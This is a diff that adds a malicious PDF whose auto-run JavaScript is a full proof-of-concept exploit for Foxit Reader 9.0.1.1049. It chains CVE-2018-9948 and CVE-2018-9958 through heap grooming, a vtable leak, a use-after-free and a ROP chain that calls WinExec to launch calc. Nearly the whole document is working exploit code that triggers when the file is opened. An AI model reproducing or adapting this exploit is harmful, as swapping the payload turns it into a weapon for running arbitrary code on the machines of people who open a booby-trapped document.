@@ -1,0 +1,211 @@
+%PDF 
+1 0 obj
+<</Pages 1 0 R /OpenAction 2 0 R>> 
+2 0 obj
+<</S /JavaScript /JS (
+
+/*
+Foxit Reader Remote Code Execution Exploit
+==========================================
+
+Written by: Steven Seeley (mr_me) of Source Incite
+Date: 22/06/2018
+Technical details: https://srcincite.io/blog/2018/06/22/foxes-among-us-foxit-reader-vulnerability-discovery-and-exploitation.html
+Download: https://www.foxitsoftware.com/downloads/latest.php?product=Foxit-Reader&platform=Windows&version=9.0.1.1049&package_type=exe&language=English
+Target version: Foxit Reader v9.0.1.1049 (sha1: e3bf26617594014f4af2ef2b72b4a86060ec229f)
+Tested on:
+    1. Windows 7 Ultimate x86 build 6.1.7601 sp1
+    2. Windows 10 Pro x86 v1803 build 10.0.17134
+Vulnerabilities leveraged:
+    1. CVE-2018-9948
+    2. CVE-2018-9958
+*/
+
+var heap_ptr   = 0;
+var foxit_base = 0;
+var pwn_array  = [];
+
+function prepare_heap(size){
+    /*
+        This function prepares the heap state between allocations
+        and frees to get a predictable memory address back. 
+    */
+    var arr = new Array(size);
+    for(var i = 0; i < size; i++){
+        arr[i] = this.addAnnot({type: "Text"});;
+        if (typeof arr[i] == "object"){
+            arr[i].destroy();
+        }
+    }
+}
+	
+function gc() {
+    /*
+        This is a simple garbage collector, written by the notorious @saelo
+        Greetz, mi amigo.
+    */
+    const maxMallocBytes = 128 * 0x100000;
+    for (var i = 0; i < 3; i++) {
+        var x = new ArrayBuffer(maxMallocBytes);
+    }
+}
+
+function alloc_at_leak(){
+    /*
+        This is the function that allocates at the leaked address
+    */
+    for (var i = 0; i < 0x64; i++){
+        pwn_array[i] = new Int32Array(new ArrayBuffer(0x40));
+    }
+}
+
+function control_memory(){
+    /*
+        This is the function that fills the memory address that we leaked
+    */
+    for (var i = 0; i < 0x64; i++){
+        for (var j = 0; j < pwn_array[i].length; j++){
+            pwn_array[i][j] = foxit_base + 0x01a7ee23; // push ecx; pop esp; pop ebp; ret 4
+        }
+    }
+}
+
+function leak_vtable(){
+    /*
+        Foxit Reader Typed Array Uninitialized Pointer Information Disclosure Vulnerability
+        ZDI-CAN-5380 / ZDI-18-332 / CVE-2018-9948
+        Found by: bit from meepwn team
+    */
+
+    // alloc
+    var a = this.addAnnot({type: "Text"});
+
+    // free
+    a.destroy();
+    gc();
+	
+    // kinda defeat lfh randomization in win 10
+    prepare_heap(0x400);
+
+    // reclaim
+    var test = new ArrayBuffer(0x60);
+    var stolen = new Int32Array(test);
+
+    // leak the vtable
+    var leaked = stolen[0] & 0xffff0000;
+
+    // a hard coded offset to FoxitReader.exe base v9.0.1.1049 (a01a5bde0699abda8294d73544a1ec6b4115fa68)
+    foxit_base = leaked - 0x01f50000;
+}
+
+function leak_heap_chunk(){
+    /*
+        Foxit Reader Typed Array Uninitialized Pointer Information Disclosure Vulnerability
+        ZDI-CAN-5380 / ZDI-18-332 / CVE-2018-9948
+        Found by: bit from meepwn team
+    */
+
+    // alloc
+    var a = this.addAnnot({type: "Text"});
+	
+    // free
+    a.destroy();
+	
+    // kinda defeat lfh randomization in win 10
+    prepare_heap(0x400);
+		
+    // reclaim
+    var test = new ArrayBuffer(0x60);
+    var stolen = new Int32Array(test);
+    
+    // alloc at the freed location
+    alloc_at_leak();
+    
+    // leak a heap chunk of size 0x40
+    heap_ptr = stolen[1];
+}
+
+function reclaim(){
+    /*
+        This function reclaims the freed chunk, so we can get rce and I do it a few times for reliability.
+        All gadgets are from FoxitReader.exe v9.0.1.1049 (a01a5bde0699abda8294d73544a1ec6b4115fa68)
+    */
+
+    var arr = new Array(0x10);
+    for (var i = 0; i < arr.length; i++) {
+        arr[i] = new ArrayBuffer(0x60);
+        var rop = new Int32Array(arr[i]);
+
+        rop[0x00] = heap_ptr;                // pointer to our stack pivot from the TypedArray leak
+        rop[0x01] = foxit_base + 0x01a11d09; // xor ebx,ebx; or [eax],eax; ret
+        rop[0x02] = 0x72727272;              // junk
+        rop[0x03] = foxit_base + 0x00001450  // pop ebp; ret
+        rop[0x04] = 0xffffffff;              // ret of WinExec
+        rop[0x05] = foxit_base + 0x0069a802; // pop eax; ret
+        rop[0x06] = foxit_base + 0x01f2257c; // IAT WinExec
+        rop[0x07] = foxit_base + 0x0000c6c0; // mov eax,[eax]; ret
+        rop[0x08] = foxit_base + 0x00049d4e; // xchg esi,eax; ret
+        rop[0x09] = foxit_base + 0x00025cd6; // pop edi; ret
+        rop[0x0a] = foxit_base + 0x0041c6ca; // ret
+        rop[0x0b] = foxit_base + 0x000254fc; // pushad; ret
+        rop[0x0c] = 0x636c6163;              // calc
+        rop[0x0d] = 0x00000000;              // adios, amigo
+
+        for (var j = 0x0e; j < rop.length; j++) {
+            rop[j] = 0x71727374;
+        }
+    }
+}
+
+function trigger_uaf(){
+    /*
+        Foxit Reader Text Annotations point Use-After-Free Remote Code Execution Vulnerability
+        ZDI-CAN-5620 / ZDI-18-342 / CVE-2018-9958
+        Found by: Steven Seeley (mr_me) of Source Incite
+    */
+
+    var that = this;
+    var a = this.addAnnot({type:"Text", page: 0, name:"uaf"});
+    var arr = [1];
+    Object.defineProperties(arr,{
+        "0":{ 
+            get: function () {
+
+                // free
+                that.getAnnot(0, "uaf").destroy();
+
+                // reclaim freed memory
+                reclaim();
+                return 1; 
+            }
+        }
+    });
+
+    // re-use
+    a.point = arr;
+}
+
+function main(){
+
+    // 1. Leak a heap chunk of size 0x40
+    leak_heap_chunk();
+
+    // 2. Leak vtable and calculate the base of Foxit Reader
+    leak_vtable();
+
+    // 3. Then fill the memory region from step 1 with a stack pivot
+    control_memory();
+
+    // 4. Trigger the uaf, reclaim the memory, pivot to rop and win
+    trigger_uaf();
+}
+
+if (app.platform == "WIN"){
+    if (app.isFoxit == "Foxit Reader"){
+        if (app.appFoxitVersion == "9.0.1.1049"){
+            main();
+        }
+    }
+}
+
+)>> trailer <</Root 1 0 R>>
